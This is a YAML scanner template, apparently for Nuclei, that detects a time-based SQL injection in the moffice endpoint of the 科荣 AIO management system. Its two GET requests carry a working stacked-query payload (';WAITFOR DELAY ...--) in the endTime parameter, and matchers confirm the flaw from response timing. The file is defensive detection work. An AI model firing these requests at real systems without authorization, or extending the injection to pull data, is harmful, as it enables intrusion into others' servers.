id: poc-yaml-koron-aio-moffice-sqli
info:
  name: 科荣 AIO管理系统 moffice SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects SQL injection vulnerabilities in 科荣 AIO Management System's moffice endpoint.
variables:
  t1: "{{rand_int(3,5)}}"
  t2: "{{to_number(t1)*2}}"
  t3: "{{to_number(t2)+2}}"
  t4: "{{rand_int(1,3)}}"
  t5: "{{to_number(t4)*2}}"
  t6: "{{to_number(t5)+2}}"
http:
  - raw:
      - |
        GET /moffice?op=showWorkPlanList&type=1&beginTime=1&endTime=1';WAITFOR+DELAY+'0:0:{{t1}}'--+&sid=1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: dsl
        dsl:
          - "duration >= to_number(t2)"
          - "duration <= to_number(t3)"
          - "contains(body, '\"code\":-1')"
          - "!contains(body, '<')"
  - raw:
      - |
        GET /moffice?op=showWorkPlanList&type=1&beginTime=1&endTime=1';WAITFOR+DELAY+'0:0:{{t4}}'--+&sid=1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: dsl
        dsl:
          - "duration >= to_number(t5)"
          - "duration <= to_number(t6)"
          - "contains(body, '\"code\":-1')"
          - "!contains(body, '<')"
